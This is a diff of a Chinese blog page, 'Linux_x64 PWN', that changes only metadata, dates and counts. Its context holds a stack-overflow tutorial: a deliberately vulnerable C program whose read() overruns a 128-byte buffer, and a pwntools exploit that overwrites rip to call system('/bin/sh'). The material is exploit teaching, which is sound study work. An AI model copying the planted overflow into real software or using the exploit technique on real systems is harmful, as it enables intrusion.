@@ -20,18 +20,18 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="linux_x64与linux_x86的区别主要两点：1.内存地址的范围由32位变成了64位，但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。2.参数传递方式发生改变，x86参数都是保存在栈上，x64中的前6个参数依次保存在rdi, rsi, rdx, rcx, r8和r9中，如果有更多参数则保存在栈上。拿一个简单的程序演示： 12345678910111213">
+  <meta name="description" content="linux_x64与linux_x86的区别主要两点：1.内存地址的范围由32位变成了64位，但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。2.参数传递方式发生改变，x86参数都是保存在栈上，x64中的前6个参数依次保存在rdi, rsi, rdx, rcx, r8和r9中，如果有更多参数则保存在栈上。拿一个简单的程序演示：">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Linux_x64 PWN">
 <meta property="og:url" content="http://example.com/2016/04/04/Linux-x64-PWN/index.html">
 <meta property="og:site_name" content="BruceFan&#39;s Blog">
-<meta property="og:description" content="linux_x64与linux_x86的区别主要两点：1.内存地址的范围由32位变成了64位，但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。2.参数传递方式发生改变，x86参数都是保存在栈上，x64中的前6个参数依次保存在rdi, rsi, rdx, rcx, r8和r9中，如果有更多参数则保存在栈上。拿一个简单的程序演示： 12345678910111213">
+<meta property="og:description" content="linux_x64与linux_x86的区别主要两点：1.内存地址的范围由32位变成了64位，但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。2.参数传递方式发生改变，x86参数都是保存在栈上，x64中的前6个参数依次保存在rdi, rsi, rdx, rcx, r8和r9中，如果有更多参数则保存在栈上。拿一个简单的程序演示：">
 <meta property="og:locale">
 <meta property="og:image" content="http://example.com/images/linuxx64pwn/vuln1.png">
 <meta property="og:image" content="http://example.com/images/linuxx64pwn/vuln1_stack1.png">
 <meta property="og:image" content="http://example.com/images/linuxx64pwn/callsystem.png">
 <meta property="article:published_time" content="2016-04-04T02:51:12.000Z">
-<meta property="article:modified_time" content="2020-11-12T02:26:14.714Z">
+<meta property="article:modified_time" content="2022-08-09T16:09:33.911Z">
 <meta property="article:author" content="Bruce Fan">
 <meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary">
@@ -196,7 +196,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
+                <time title="更新于：2022-08-10 00:09:33" itemprop="dateModified" datetime="2022-08-10T00:09:33+08:00">2022-08-10</time>
               </span>
 
           
@@ -211,6 +211,7 @@
 
       
         <h3 id="linux-x64与linux-x86的区别"><a href="#linux-x64与linux-x86的区别" class="headerlink" title="linux_x64与linux_x86的区别"></a>linux_x64与linux_x86的区别</h3><p>主要两点：<br>1.内存地址的范围由32位变成了64位，但是可以使用的内存地址不能大于<code>0x00007fffffffffff</code>，否则会抛出异常。<br>2.参数传递方式发生改变，x86参数都是保存在栈上，x64中的前6个参数依次保存在<code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code>和<code>r9</code>中，如果有更多参数则保存在栈上。<br>拿一个简单的程序演示：</p>
+<a id="more"></a>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* compile on Linux_64 with gcc -fno-stack-protector vuln1 -o vuln1.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>用gdb简单的反编译一下vulnerable_function<br><img src="/images/linuxx64pwn/vuln1.png"><br>由<code>lea rax, [rbp-0x80]</code>可知栈结构如下：<br><img src="/images/linuxx64pwn/vuln1_stack1.png"><br>所以要overwrite<code>rip</code>为callsystem()函数的地址，需要136(0x80+8)个占位字节+callsystem()的地址。<br><img src="/images/linuxx64pwn/callsystem.png"><br>exp如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vuln1&#x27;</span>)</span><br><span class="line">callsystem = <span class="number">0x400584</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">136</span> + p64(callsystem)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -344,14 +345,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">125</span>
+          <span class="site-state-item-count">127</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-count">18</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -378,7 +379,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
